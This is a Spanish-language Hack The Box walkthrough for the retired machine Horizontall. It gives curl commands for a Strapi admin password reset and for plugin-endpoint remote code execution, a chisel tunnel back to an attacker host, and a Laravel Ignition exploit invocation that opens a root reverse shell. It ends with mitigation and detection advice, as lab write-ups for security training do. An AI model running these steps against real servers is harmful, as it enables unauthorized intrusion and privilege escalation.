---
machine: Horizontall
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, strapi, laravel, cve-2019-19609, cve-2021-3129, pivoting]
---

# Horizontall — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El subdominio `api-prod.horizontall.htb` ejecuta Strapi 3.0.0-beta.17.4. CVE-2019-18818 permite resetear la contraseña de admin y CVE-2019-19609 ejecuta comandos. El shell como `strapi` revela un Laravel escuchando en `127.0.0.1:8000`; con un túnel se explota CVE-2021-3129 (Ignition) para root.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p22,80 <IP>
```

El sitio `horizontall.htb` es una landing. Se enumeran vhosts:

```bash
ffuf -u http://horizontall.htb -H 'Host: FUZZ.horizontall.htb' \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

Aparece `api-prod.horizontall.htb`, con el panel de Strapi en `/admin`.

## Acceso inicial

La versión se obtiene de `/admin/init` o del bundle. Strapi 3.0.0-beta.17.4 es vulnerable a CVE-2019-18818:

```bash
curl -s -X POST http://api-prod.horizontall.htb/admin/auth/reset-password \
  -H 'Content-Type: application/json' \
  -d '{"code":"<RESET_CODE>","password":"<NEW_PASSWORD>","passwordConfirmation":"<NEW_PASSWORD>"}'
```

Se inicia sesión en `/admin` y se obtiene el JWT. CVE-2019-19609 se explota en el endpoint de plugins:

```bash
curl -s -X POST http://api-prod.horizontall.htb/admin/plugins/install \
  -H "Authorization: Bearer <JWT>" \
  -H 'Content-Type: application/json' \
  -d '{"plugin":"<PLUGIN>","port":<PORT>}'
```

El payload lanza una reverse shell como `strapi`.

## Movimiento lateral

```bash
ss -tlnp
# 127.0.0.1:8000
```

El puerto 8000 solo escucha en local. Se crea un túnel con chisel o SSH local port forwarding:

```bash
chisel client <LHOST>:<LPORT> 8000:127.0.0.1:8000
```

Se identifica Laravel con debug activo. La página de error filtra la versión y la ruta del proyecto.

## Escalada a root

Laravel 8 con Ignition es vulnerable a CVE-2021-3129. Se envía un payload que escribe un PHAR y lo deserializa para ejecutar comandos:

```bash
python3 exploit.py http://127.0.0.1:8000 <LHOST> <LPORT>
```

El shell resultante es root. Se lee la flag y se redacta.

## Evidencia

- Respuesta de `admin/init` y versión de Strapi.
- Reset de contraseña y JWT redactados.
- `ss -tlnp` mostrando el puerto 8000.
- Petición a Ignition y `id` como root.

## Lecciones aprendidas

- Strapi antiguo acumula fallos de autenticación y RCE.
- Un servicio interno puede ser la verdadera escalada.
- El modo debug de Laravel expone Ignition y rutas absolutas.
- El pivoting con chisel evita exponer el puerto interno.

## Mitigación y detección

- Actualizar Strapi y Laravel; desactivar `APP_DEBUG` en producción.
- Restringir `/admin` y los endpoints de plugins.
- No exponer servicios de desarrollo en el host.
- Detectar resets de contraseña masivos y peticiones a `_ignition/execute-solution`.

## Referencias

- <https://nvd.nist.gov/vuln/detail/CVE-2019-19609>
- <https://nvd.nist.gov/vuln/detail/CVE-2021-3129>
- <https://www.hackthebox.com/machines/horizontall>
